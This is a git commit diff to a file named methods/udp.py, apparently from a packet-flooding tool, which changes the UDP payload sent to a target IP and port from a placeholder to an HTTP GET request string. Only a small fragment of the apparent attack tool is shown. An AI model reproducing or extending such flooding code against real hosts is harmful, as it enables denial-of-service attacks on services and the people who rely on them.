a5076031e1e3f06c98435e07f51c3196221f2b0d
rxyzqc <120246386+rxyzqc@users.noreply.github.com>
2022-12-26 22:30:46 +0300

    Add files via upload

--- methods/udp.py
+++ methods/udp.py
@@ -10,7 +10,7 @@ s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
 def udp():
     try:
-        s.sendto(b'UDP packet', (ip, port))
+        s.sendto(f"GET / HTTP/1.1\r\nHost: {ip}\r\n\r\n".encode(), (ip, port))
         print("\033[32m[+]\033[0mUDP Packet sent!")
     except Exception as err:
         print(err)
